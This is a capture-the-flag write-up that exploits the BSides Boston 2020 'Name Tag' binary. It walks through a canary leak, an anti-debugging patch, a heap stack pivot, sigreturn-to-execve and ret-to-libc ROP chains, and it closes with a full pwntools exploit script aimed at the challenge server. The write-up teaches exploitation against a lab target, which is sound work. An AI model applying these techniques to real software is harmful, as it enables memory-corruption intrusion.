# Name Tag (Pwn, 500 points, 1 solve)

> Welcome to Bsides Boston!!! We forgot to print name tags, can you fill one
> out?  
> Note: Libc is NOT needed to solve this challenge.

First we do some static analysis on the binary to figure out what kind it is,  
the protections it has, and a general understanding of the program.

```sh

$ pwn checksec name_tag  
[*] '/home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
$ file name_tag  
name_tag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=da6ef25bae2ec5b2272517164cc5ac45d43c7f59, for GNU/Linux 3.2.0,
not stripped  
```

So we have a 64-bit binary with Parial RELRO, stack canaries, a non-executable  
stack (NX), and is not a position independent executable (PIE). In practice
this  
means:  
- Any overflow we would to do will also need to bypass the canary  
- Return-oriented programming (ROP) will probably be required because of NX  
- The executable and GOT is always in the same spot so we can use static  
 addresses for locations of functions and gadgets.  
- It could be a heap related exploit since we don't need to overflow canary  
 for that.

Decompiling the binary with Ghidra and looking at the main function gives us
the  
following pseudocode, variables named by me for clarity when parsing it.

```c  
undefined8 main(void)  
{  
 char *bio;  
 long in_FS_OFFSET;  
 char last_name [32];  
 char first_name [40];  
 long cookie;  
  
 cookie = *(long *)(in_FS_OFFSET + 0x28);  
 setup();  
 memset(last_name,0,0x20);  
 memset(first_name,0,0x20);  
 puts("\nWelcome to Bsides Boston!!!!!!!!\n");  
 puts("In order for your name tag to be created you need to fill out some
information.");  
 printf("Can you please tell us your first name? ");  
 readStr(first_name,64);  
 printf("\nWelcome %s\n",first_name);  
 puts("Can you please tell us a little about yourself?");  
 printf("Bio: ");  
 bio = (char *)malloc(512);  
 readStr(bio,512);  
 printf("Great!!!! Here\'s your name tag id: %d\n",bio);  
 printf(  
       "\nOh I almost forgot. Can you tell us your last name to finish up the name tag creationprocess? "  
       );  
 readStr(last_name,112);  
 printTag(first_name,last_name,bio,0x20);  
 if (cookie != *(long *)(in_FS_OFFSET + 0x28)) {  
                   /* WARNING: Subroutine does not return */  
   __stack_chk_fail();  
 }  
 return 0;  
}  
```

So the program asks us for some user input (name, bio, last_name) and then  
prints out some information related to it.

The first thing we notice is that there are 3 reads for our user input, where  
two of them allow us to write outside of the allocated buffer. This is
possible  
with both the `first_name` and `last_name` reads.

We also see that the heap is used via the `malloc` call for the bio, but we  
allocate and read in 512 bytes, so there isn't an overflow in the heap here.  
It's also never `free`'d or used as a function pointer, so we can eliminate  
heap exploits from out possible exploits.

The last thing is that we see an "ID" given for the bio which is printed  
a decimal number of the pointer, so that is leaking the address of `bio` in
the  
heap.

So at this point we know the following:  
- We can overflow `first_name` and `last_name` enough to overwrite the return  
 pointer, but we still need to deal with the stack canary.  
- The application leaks the heap address

## Dynamic Analysis (Bypassing Anti-Debugging)

Next let's move on dynamic analysis and see what we can find.

```sh  
$ gdb -q ./name_tag  
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.  
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)  
Reading symbols from ./name_tag...  
(No debugging symbols found in ./name_tag)  
pwndbg> run  
Starting program: /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag  
[Inferior 1 (process 97856) exited normally]  
```

We see that the program just exits when we try to debug it which isn't
expected  
since this is an interactive program. We can also run it through `ltrace` and  
`strace` to get more information.

```sh  
$ ltrace ./name_tag  
_exit(0 <no return ...>  
+++ exited (status 0) +++

$ strace ./name_tag  
execve("./name_tag", ["./name_tag"], 0x7ffd0e5f33c0 /* 58 vars */) = 0  
brk(NULL)                               = 0x988000  
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or
directory)  
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3  
fstat(3, {st_mode=S_IFREG|0644, st_size=93864, ...}) = 0  
mmap(NULL, 93864, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f011f80b000  
close(3)                                = 0  
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3  
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0n\2\0\0\0\0\0"...,
832) = 832  
fstat(3, {st_mode=S_IFREG|0755, st_size=1839792, ...}) = 0  
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) =
0x7f011f809000  
mmap(NULL, 1852680, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) =
0x7f011f644000  
mprotect(0x7f011f669000, 1662976, PROT_NONE) = 0  
mmap(0x7f011f669000, 1355776, PROT_READ|PROT_EXEC,
MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7f011f669000  
mmap(0x7f011f7b4000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE,
3, 0x170000) = 0x7f011f7b4000  
mmap(0x7f011f7ff000, 24576, PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7f011f7ff000  
mmap(0x7f011f805000, 13576, PROT_READ|PROT_WRITE,
MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f011f805000  
close(3)                                = 0  
arch_prctl(ARCH_SET_FS, 0x7f011f80a540) = 0  
mprotect(0x7f011f7ff000, 12288, PROT_READ) = 0  
mprotect(0x403000, 4096, PROT_READ)     = 0  
mprotect(0x7f011f84c000, 4096, PROT_READ) = 0  
munmap(0x7f011f80b000, 93864)           = 0  
ptrace(PTRACE_TRACEME)                  = -1 EPERM (Operation not permitted)  
exit_group(0)                           = ?  
+++ exited with 0 +++  
```

So `ltrace` shows us that it just exists and doesn't even try to run. `strace`  
has the standard setup but then has a `ptrace(PTRACE_TRACEME)` call returning  
an error `EPERM (Operation not permitted)`. This is indicative of anti-
debugging  
protections on the binary. So if we want to continue digging in we'll need to  
bypass this, we can do that by finding where this happens in the binary and  
patch it to not.

Looking at the functions in Ghidra we can see an `init` function which has the  
following assembly.

```  
push   rbp  
mov    rbp,rsp  
sub    rsp,0x10  
mov    rax,0x56  
xor    rdi,rdi  
xor    rsi,rsi  
mov    rdx,0x1  
xor    r10,r10  
add    rax,0xe  
add    rax,0x1  
syscall  
mov    DWORD PTR [rbp-0x4],eax  
cmp    DWORD PTR [rbp-0x4],0xffffffff  
jne    4015cf <init+0x3c>  
mov    edi,0x0  
call   401040 <_exit@plt>  
nop  
leave  
ret  
```

It's slightly obfuscated at exactly what's happening due to manipulating `rax`  
in multiple instructions, but this turns out to be important for certain  
exploits. Adding up `0x56 + 0xe + 0x1` is `101` in decimal, which is the  
[`sys_ptrace`
syscall](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/),  
so the binary self-traces itself which prevents debuggers from attaching and  
inspecting what's going on. This is what we need to remove.

There are many ways you could do this, but the way I ended up was changing the  
initial `mov rax, 0x56` instruction to a `mov rax, 0x57`. This has the effect
of  
changing the syscall to `sys_getuid` which doesn't take any arguments, so the  
values of the other registers doesn't matter and this basically becomes a
noop.  
I used the hex editor in Binary Ninja to do this, but many tools will work
here.  
The new binary is saved as `name_tag-tracable` so we have the original and
this  
one around when we want to try against the real binary.

Now that we can debug it, we can provide some input and take a look at the
stack  
to see what our options are. The disassembly above is actually slightly wrong,  
first name is is also a 32-byte buffer, not 40. So let's max these buffers out  
and take a look at the stack in GDB.

```sh  
$ gdb -q ./name_tag-traceable  
pwndbg> x/2i 0x401591  
  0x401591 <main+327>: leave  
  0x401592 <main+328>: ret  
pwndbg> break *0x401591  
Breakpoint 1 at 0x401591  
pwndbg> run  
Starting program: /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable

Welcome to Bsides Boston!!!!!!!!

In order for your name tag to be created you need to fill out some
information.  
Can you please tell us your first name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
Can you please tell us a little about yourself?  
Bio: don't care right now  
Great!!!! Here's your name tag id: 4215456

Oh I almost forgot. Can you tell us your last name to finish up the name tag
creation process? BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Name Tag:  
================================================  
| First name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA |  
| Last name: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  |  
================================================  
Bio: don't care right now

Breakpoint 1, 0x0000000000401591 in main ()  
pwndbg> x/14xg $rsp  
0x7fffffffdc50: 0x0000000000000000      0x00000000004052a0  
0x7fffffffdc60: 0x4242424242424242      0x4242424242424242  
0x7fffffffdc70: 0x4242424242424242      0x4242424242424242  
0x7fffffffdc80: 0x4141414141414141      0x4141414141414141  
0x7fffffffdc90: 0x4141414141414141      0x4141414141414141  
0x7fffffffdca0: 0x00007fffffffdda0      0x4d53360498afcd00  
0x7fffffffdcb0: 0x00000000004015e0      0x00007ffff7e16cca  
pwndbg> x/s 0x4052a0  
0x4052a0:       "don't care right now"  
pwndbg> x 0x4015e0  
0x4015e0 <__libc_csu_init>:     0x8d4c5741fa1e0ff3  
pwndbg> x 0x7ffff7e16cca  
0x7ffff7e16cca <__libc_start_main+234>: 0x480001795fe8c789  
```

Turning this into some ASCII here is our stack from top to bottom:  
```  
[ 8-bytes] 0  
[ 8-bytes] bio pointer  
[32-bytes] last name  
[32-bytes] first name  
[ 8-bytes] stack address pointing to the value 1 (not sure what this is used
for)  
[ 8-bytes] stack cookie  
[ 8-bytes] saved RBP  
[ 8-bytes] return pointer  
```

When we read into these addresses out input starts at the beginning of each of  
these pointers and goes down. Recall that we can read up to `64` bytes into  
first name, so we can overwrite up to the return pointer. We can read `112`
into  
which will overwrite first name but allow us to go an extra `16=112-64-32`
bytes  
which could be helpful.

# Bypassing the stack cookie

But our first goal is to defeat the stack cookie. Without this any overwrite
we  
do will just fail the stack cookie check and crash. The previous output
actually  
hinted at how we could do this. Did you notice that the printed last name  
actually read past out input and into the first name?

This happened because it's printed with the `%s` format specifier which will  
print out all bytes until a zero byte is encountered, and because of a flaw in  
the `readStr` which doesn't enforce that what it reads ends in a zero byte,  
`printf` continues reading until the first one it sees. We can leverage this  
to leak the stack cookie so that we can overwrite the buffer and still provide  
a valid stack cookie.

From running the program multiple times you'll see that the lowest byte of the  
cookie is always 0. I suspect this is a protection against accidentally
leaking  
it via other mechanisms, but we can also use this property to get a valid
cookie.  
We want to overwrite the bytes before the cookie and the lowest byte of the  
cookie with non-zero values so that it will read out the highest 7 bytes of
the  
cookie for us. Looking at the stack diagram above, we see we need to write 41  
bytes to overflow into the cookie.

```sh  
pwndbg> break *0x40158a  
Breakpoint 2 at 0x40158a  
pwndbg> run  
Starting program: /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable

Welcome to Bsides Boston!!!!!!!!

In order for your name tag to be created you need to fill out some
information.  
Can you please tell us your first name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
S@  
...snipped  
pwndbg> x/14xg $rsp  
0x7fffffffdc50: 0x0000000000000000      0x00000000004052a0  
0x7fffffffdc60: 0x4242424242424242      0x4242424242424242  
0x7fffffffdc70: 0x4242424242424242      0x4242424242424242  
0x7fffffffdc80: 0x4141414141414141      0x4141414141414141  
0x7fffffffdc90: 0x4141414141414141      0x4141414141414141  
0x7fffffffdca0: 0x4141414141414141      0x8353d0d2ab0ab641  
0x7fffffffdcb0: 0x00000000004015e0      0x00007ffff7e16cca  
```

Since many of the bytes aren't printable it's hard to see exactly what we
leaked  
from the ASCII representation, but if you capture the output and print in
bytes  
you'll see that we leak from the start of our first name up to the saved base  
pointer because the first zero byte is output. Constructing the payload on the  
terminal and dumping into `hexdump` we can see this the bytes in printed in  
little endian.

```sh  
$ python3 -c 'print("A"*40+"B")' | ./name_tag-traceable | hexdump -C  
...snip  
00000090  69 72 73 74 20 6e 61 6d  65 3f 20 0a 57 65 6c 63  |irst name? .Welc|  
000000a0  6f 6d 65 20 41 41 41 41  41 41 41 41 41 41 41 41  |ome AAAAAAAAAAAA|  
000000b0  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|  
000000c0  41 41 41 41 41 41 41 41  41 41 41 41 42 ad 01 27  |AAAAAAAAAAAAB..'|  
000000d0  a3 c7 7d fd e0 15 40 0a  43 61 6e 20 79 6f 75 20  |..}[email protected] you |  
*** stack smashing detected ***: terminated  
...snip  
```

We use the different 41st character to easily identify where the leak starts.  
You can also notice that we get the "stack smashing detected" error meaning we  
have overwritten the cookie as expected, but it's currently wrong. We'll fix  
this later, but we know the cookie at this point because the lowest byte is  
always 0 and that's the only one we overwrite, so if we set it back we have
the  
cookie. A bitwise and will take care of this for us `cookie &=  
0xffffffffffffff00`.

With the cookie leaked we now have two writes left, 512 bytes to the heap and  
112 to last name on the stack. The second write is the one we can leverage fix  
the cookie before the function returns and start a ROP, but we are limited to  
three 64-bit values due to the liit on the read. If we knew the libc it was  
using we might be able to find a "one shot" gadget and return there but at
this  
point we don't and due to something we'll discuss later, this wouldn't work  
anyways. But we do have the ability to write a lot of data to the heap, so  
what if we could write a ROP chain there and use that? Well, we can! This is  
a concept known as "stack pivoting" because we need to pivot the stack to  
a different spot so that the ROP chain will continue reading our instructions.

Because the binary leaks where the heap is, we can write a ROP chain to heap
and  
then have our first ROP change the stack (aka RSP) to point to that location  
instead. Becaue the heap is readable and writable this behaves basically the  
same as the stack normally does. First we need to find a gadget to manipulate  
RSP, so we find one with ropper.

```  
name_tag[master*] $ ropper --file name_tag --search "pop rsp"  
[INFO] Searching for gadgets: pop rsp  
0x000000000040163d: pop rsp; pop r13; pop r14; pop r15; ret;  
```

To recap the plan:  
1. Leak the stack cookie via first_name  
2. Write a ROP chain to the `bio` in the heap and get the address  
3. Write the stack pivot ROP chain to the heap address

Looking at our previous stack chart again, our ROP payload for the stack pivot  
is:

```  
[72-bytes] padding  
[ 8-bytes] leaked cookie & 0xffffffffffffff00  
[ 8-bytes] heap address & 0xffffffffffffff00  # This makes it somewhat valid
but isn't terribly important what this is set to  
[ 8-bytes] pop rsp gadget  
[ 8-bytes] heap address (new RSP)  
```

With this we can successfully pivot the stack into the heap with a stage 2 ROP  
chain. Now we need to decide what to do with it.

Our gadget will first do `pop r13; pop r14; pop r15; ret` so the first three  
values need to be whatever we want in those registers, and after that our
second  
ROP begins. Since I don't use those registers I just set them to `1, 2, 3`  
accordingly. From here we have 488-bytes of a ROP chain to use and need to  
decide how to exploit it.

Early on I noticed the peculiar way of setting up `rax` for the ptrace syscall  
and you can see that there is a gadget that does `add rax,0xe; add rax,0x1;  
syscall` which if `rax` is 0 will set it to `15`, which is the system call for  
`sigreturn`, which allows us to get full control of all of the registers. This  
is a really powerful gadget and combined with the challenge description of  
"Libc is not needed" seems like the intended path. With sigreturn exploits you  
often call the `mprotect` syscall to make a section of memory executable to  
bypass NX protections and then execute shellcode from it. I was initially
going  
to go down this route but decided that doing an `execve` syscall would be  
easier, which turned out to be true, but also led to me not solving the  
challenge during the CTF :(

At this point I'll branch this writeup into two sections because I have two  
exploits, one that only works against the patched binary without ptrace and
the  
other against the real challenge but an unintended solution. I haven't written  
up the official solution due to some extra complexities with doing it, but
I'll  
also include a brief summary of how that works too.

## Sigreturn to execve exploit

For this exploit our second rop chain will set up a sigreturn to the `execve`  
syscall, providing `/bin/sh` as the argument to get a shell. *THIS ONLY WORKS
ON  
THE PATCHED BINARY.* I couldn't figure out why this wasn't working on the real  
one during the CTF, but after talking with the author it seems the `ptrace`
call  
will trap `execve`'s with `SIGTRAP` so they just won't run which causes this,
or  
any exploit using execve to fail. Let's set up our ROP chain to do so.

The first thing we need is a pointer to a `/bin/sh` string. From pwntools we
can  
search the running binary to find if they left one for us. There's one in libc  
which is normal, but since we don't know the libc we can't use that. So we'll  
need to write it to a known location so we can provide the address when we do  
the syscall. We can see which sections are writable in pwntools too.

```  
pwndbg> search "/bin/sh"  
libc-2.31.so    0x7ffff7f7a143 0x68732f6e69622f /* '/bin/sh' */  
pwndbg> vmmap name_tag  
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
         0x400000           0x401000 r--p     1000 0      /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable  
         0x401000           0x402000 r-xp     1000 1000   /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable  
         0x402000           0x403000 r--p     1000 2000   /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable  
         0x403000           0x404000 r--p     1000 2000   /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable  
         0x404000           0x405000 rw-p     1000 3000   /home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable  
```

So we can write to the data section and since the binary does not use PIE this  
is a static location we can reference. We do need to be a bit careful writing  
here since it also houses data the program uses for various purposes, but
since  
our input is really short and we aren't returning back to the program we can  
just write to the beginning.

After we read `/bin/sh` into that location we will want to clear out `rax` so  
that when we return back to the sigreturn gadget `add rax,0xe; add rax,0x1;
syscall`  
it sets `rax` to 15 as we want to execute the sigreturn syscall. After some  
gadget searching we find a gadget that can clear it for us:

```  
name_tag[master*] $ ropper --file name_tag --search "mov eax"  
[INFO] Searching for gadgets: mov eax  
0x0000000000401279: mov eax, 0; pop rbp; ret;  
```

At this point our chain is:  
1. Read `/bin/sh` into known location  
1. Clear `rax`  
1. sigreturn sycall

The way that sigreturn works is that it reads the values of the stack after
the  
syscall and loads them into the appropriate registers and transfers execution  
there. There are posts which go into the details of the structure, but we just  
use the pwntools class to construct it for us. Our ROP payload we write to the  
heap will look like this:

```python  
bin_sh_addr = 0x404000  
r = ROP(exe)  
r.readStr(bin_sh_addr, 0xff)  
r.raw(clear_eax)  
r.raw(0) # pad because the clear_eax has an extra pop  
r.raw(sigreturn)

frame = SigreturnFrame()  
frame.rax = constants.SYS_execve  
frame.rdi = bin_sh_addr  
frame.rsi = 0  
frame.rdx = 0  
frame.rip = syscall

payload = r.chain() + bytes(frame)  
```

Putting all this together and summarizing, the exploit works as follows:  
1. Leak stack cookie  
2. Write read /bin/sh and sigreturn to execve to heap  
3. Ovewrite stack cookie and return of main to pivot stack to heap and execute  
  from there.  
4. Profit.

```sh  
name_tag[master*] $ ./exploit.py LOCAL  
[+] Starting local process '/home/kali/gh-
ctf/bsidesbos-2020/name_tag/name_tag-traceable': pid 101633  
[*] -> cookie: 0x49da6b642084c700  
[*] Switching to interactive mode  
$ id  
uid=1000(kali) gid=1000(kali)
groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),132(scanner),998(docker)  
```

The full code can be seen at the end of this post.

## Ret-to-libc exploit

While the author didn't indend for a ret-to-libc exploit to work, I was able
to  
use the ROP to leak GOT addresses and found a database
((libc.rip)[http://libc.rip]) which told me the  
version, so I could use the correct offsets and get the flag. We could use
this  
to do another `execve(`/bin/sh`, 0, 0)` but as I mentioned earlier we can't  
actually run `execve` on the official binary due to the ptraceing. So we need
to  
try and open the file, read it, and then write it back to standard out.

So here is what we need to do:  
1. Leak libc addresses from GOT to calculate libc base  
2. Create a new ROP using these addresses to read the flag file and print it

My exploit might be a little more complicated than it needs to be, but this
was  
after working on this problem for many hours so I was braindead and I mean, it  
works :) The complexity is that in the second ROP we actually set up for  
a second stack pivot to a third ROP chain. I was running into some trouble
with  
overwriting too much of the data section causing the program to crash so  
I wanted to get the heap address and be able to use that more, though the  
exploit only ends up reading the flag into it which is pretty small. Okay, to  
the exploit.

```python  
# These were chosen by looking at the writable data section in the debugger to  
# find spots that were mostly 0s so it wouldn't break things.  
data_writable = 0x404f00  
flag_addr = 0x404e00

r = ROP(exe)  
# Print libc puts and malloc address from GOT.  
r.puts(exe.got['puts'])  
r.puts(exe.got['malloc'])  
# Read the flag file name into one location and our next ROP into another  
r.readStr(flag_addr, 0xff)  
r.readStr(data_writable, 0xfff)  
# Pivot the stack to where we are writing the next ROP  
r.raw(pop_rsp) #  pop rsp; pop r13; pop r14; pop r15; ret;  
r.raw(data_writable)  
heap = do_rop(io, r.chain())  
heap += 1024 # get our of the way of our previous writes (recall our first ROP
started here)

# Parse the leaked address and calculate the base address. This was sometimes  
# inconsistent, I asssume 0s in the addresses, which is why the length check
is  
# there.  
io.recvuntil("Bio: ")  
leaks = io.clean()[:-1].split(b"\n")  
if len(leaks) < 3:  
   return  
puts_addr = int.from_bytes(leaks[-2], "little")  
malloc_addr = int.from_bytes(leaks[-1], "little")  
libc.address = puts_addr-libc.symbols['puts']

# Write flag file name to flag_addr  
io.sendline("./flag.txt")

# Do the open/read/write ROP, ensuring to include libc in the ROP instance so  
# it can find the right address.  
r = ROP([exe, libc])  
r.raw(1) #  r13-15 (for the rsp gadget used to pivot stack)  
r.raw(2) #  r13-15  
r.raw(3) #  r13-15  
r.open(flag_addr, 0) # open with read permission  
if args.LOCAL: # file descriptors experimentally chosen until it worked  
   r.read(3, heap, 0xff)  
else:  
   r.read(6, heap, 0xff)  
r.write(1, heap, 0xff) # write to stdout  
io.sendline(r.chain())

# Retrieve the flag from stdout, getting rid of excess 0s printed.  
dat = io.recv().replace(b"\x00", b"").decode()  
if len(dat) > 0:  
   print(dat)  
```

Running this against the real server...

```  
$ ./exploit.py REMOTE  
[*] '/home/kali/gh-ctf/bsidesbos-2020/name_tag/name_tag-traceable'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
[*] '/home/kali/gh-ctf/bsidesbos-2020/name_tag/libc-2.32-x86_64.so'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
[+] Opening connection to challenge.ctf.games on port 32181: Done  
[*] Loaded 15 cached gadgets for 'name_tag-traceable'  
[*] -> cookie: 0x28e854e5072aa00  
[*] libc: 0x7f17406d1000  
[*] Loaded 187 cached gadgets for './libc-2.32-x86_64.so'  
flag{not_your_typical_overflow}  
```

## Intended exploit

I wasn't able to get the indended solution working myself, but after
discussing  
with the author can provide a summary of how it was expected to work. tldr is  
that it uses the same stack cookie leak, pivoting and sigreturn, but you are  
supposed to do the mprotect syscall and read shellcode to get the flag.
There's  
one big gotcha with just doing mprotect that I couldn't figure out when I was  
trying it.

If you take my exploit for the sigreturn to execve it will just about work,
but  
you'll see if you change just rax to be `constants.SYS_mprotect` it will fail  
pretty miserably with some confusing issues. After spending some time with it  
I figured out the issue is that mprotect is syscall `10`, which is `0xa` in
hex,  
and a `\n` newline in ascii. The `readStr` call we are using to read input  
breaks at `\n` so we end up with the excess bytes remaining on stdin for later  
calls which ends up breaking our ROP. Ideally we could use another function
out  
of the PLT to read bytes that doesn't do this but nothing is available except  
`getchar` and that would be a serious pain to read enough input with.

I tried various different ways of reading it with no success.  
1. In multiple chunks to avoid the `0xa` but the reading doesn't add one so it's  
  invalid  
1. Use `memset` in ROP to set the byte directly, but there wasn't a `pop rdx`  
  gadget which is needed to set the third arg.

The intended solution was to set it to `9` instead of `10` in the frame, and  
then rather than setting `rip` directly to `syscall` in the sigreturn frame  
(standard practice), you set it to an instruction before which does `add rax,  
0x1; syscall`. So simple, just had to think a little bit more out of the box  
than a "standard" exploit, very cool!

## Conclusion

This challenge was really fun and I learned so much along the way. It was well  
made to force you down specific paths and had you tie a whole series of
problems  
together into an exploit, but forced you to think outside of the box to get  
a solution.

Great job to the author and organizers! I just wish it was a longer CTF so  
I could have solved it during.

See my [GitHub repo for binaries, libc,
etc](https://github.com/jakecraige/ctf/tree/master/bsidesbos-2020/name_tag).

## Exploit Script

```python  
#!/usr/bin/env python3  
from pwn import *

#  exe = context.binary = ELF('name_tag')  
exe = context.binary = ELF('name_tag-traceable')

sigreturn = 0x4015b2 # add rax 14; add rax 1; syscall  
syscall = 0x4015ba   # syscall  
pop_rsp = 0x40163d   # pop rsp; pop r13; pop r14; pop r15; ret;  
clear_eax = 0x401279 # mov eax, 0; pop rbp; ret

host = args.HOST or 'challenge.ctf.games'  
port = int(args.PORT or 32181)  
#  context.log_level = "DEBUG"

if args.LOCAL:  
   libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  
else:  
   # Found via leaking GOT entries and querying libc.rip. It was unintended  
   # to find a result but the author missed this site's DB.  
   libc = ELF("./libc-2.32-x86_64.so")

def local(argv=[], *a, **kw):  
   '''Execute the target binary locally'''  
   if args.GDB:  
       return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)  
   else:  
       return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):  
   '''Connect to the process on the remote host'''  
   io = connect(host, port)  
   if args.GDB:  
       gdb.attach(io, gdbscript=gdbscript)  
   return io

def start(argv=[], *a, **kw):  
   '''Start the exploit against the target.'''  
   if args.LOCAL:  
       return local(argv, *a, **kw)  
   else:  
       return remote(argv, *a, **kw)

gdbscript = '''  
break main  
continue  
'''.format(**locals())

# Arch:     amd64-64-little  
# RELRO:    Partial RELRO  
# Stack:    Canary found  
# NX:       NX enabled  
# PIE:      No PIE (0x400000)

def do_rop(io, chain):  
   io.sendline((b"A"*40)+b"\x01")  
   io.recvuntil(b"A"*40)  
   cookie = int.from_bytes(io.recv()[:8], "little")  
   cookie &= 0xffffffffffffff00 # zero out lowest byte  
log.info("-> cookie: " + hex(cookie))  
   io.clean()

   p = pack(1) + pack(2) + pack(3) # r13-15, ROP next  
   p += chain  
   if len(p) > 512:  
       raise Exception("paylod too big! Max 512, was: {}".format(len(p)))

   io.sendline(p)  
   io.recvuntil("tag id: ")  
   heap_addr = int(io.recvline()[:-1])

   p = b"A"*72  
   p += pack(cookie)  
   p += pack(heap_addr & 0xfffffffffffff000) # rbp  
   p += pack(pop_rsp)   # pop rsp; pop r13; pop r14; pop r15; ret;  
   p += pack(heap_addr) # pop to esp  
   io.sendline(p)

   return heap_addr

def do_execve_shell():  
   """  
   This exploit uses ROP to read in a /bin/sh string and then uses a sigreturn  
   to execve and get a shell. Due to the anti-debugging measures in the
offical  
   binary (it runs the ptrace syscall), this only works on patched binaries
and  
   not the real flag, but was part of my exploit development so I kept it  
   around for example purposes. The ptrace makes it so that execve sycalls get  
   SIGTRAP'd which stops them from executing.  
   """  
   io = start()

   bin_sh_addr = 0x404000  
   r = ROP(exe)  
   r.readStr(bin_sh_addr, 0xff)  
   r.raw(clear_eax)  
   r.raw(0) # pad because the clear_eax has an extra pop  
   r.raw(sigreturn)

   frame = SigreturnFrame()  
   frame.rax = constants.SYS_execve  
   frame.rdi = bin_sh_addr  
   frame.rsi = 0  
   frame.rdx = 0  
   frame.rip = syscall

   do_rop(io, r.chain() + bytes(frame))

   io.clean()  
   io.sendline("/bin/sh")  
   io.interactive()

def do_libc_exploit():  
   """  
   This exploit leaks libc addresses from GOT to calculate the base address  
   and leverages that to ROP an open/read/write flow to get the flag.  
   """  
   io = start()  
   data_writable = 0x404f00  
   flag_addr = 0x404e00

   # First ROP is to leak the heap address and set us up for another.  
   r = ROP(exe)  
   r.puts(exe.got['puts'])  
   r.puts(exe.got['malloc'])  
   r.readStr(flag_addr, 0xff)  
   r.readStr(data_writable, 0xfff)  
   r.raw(pop_rsp) #  pop rsp; pop r13; pop r14; pop r15; ret;  
   r.raw(data_writable)  
   heap = do_rop(io, r.chain())  
   heap += 1024 # get our of the way of our previous writes

   io.recvuntil("Bio: ")  
   leaks = io.clean()[:-1].split(b"\n")  
   if len(leaks) < 3:  
       return  
   puts_addr = int.from_bytes(leaks[-2], "little")  
   malloc_addr = int.from_bytes(leaks[-1], "little")  
   libc.address = puts_addr-libc.symbols['puts']  
log.info("libc: " +hex(libc.address))

   io.sendline("./flag.txt")

   r = ROP([exe, libc])  
   r.raw(1) #  r13-15  
   r.raw(2) #  r13-15  
   r.raw(3) #  r13-15  
   r.open(flag_addr, 0)  
   if args.LOCAL: # exerimentally chosen FDs of the open flag file  
       r.read(3, heap, 0xff)  
   else:  
       r.read(6, heap, 0xff)  
   r.write(1, heap, 0xff)  
   io.sendline(r.chain())

   dat = io.recv().replace(b"\x00", b"").decode()  
   if len(dat) > 0:  
       print(dat)

#  do_execve_shell()  
do_libc_exploit()  
```  

Original writeup
(https://github.com/jakecraige/ctf/blob/master/bsidesbos-2020/name_tag/writeup.md).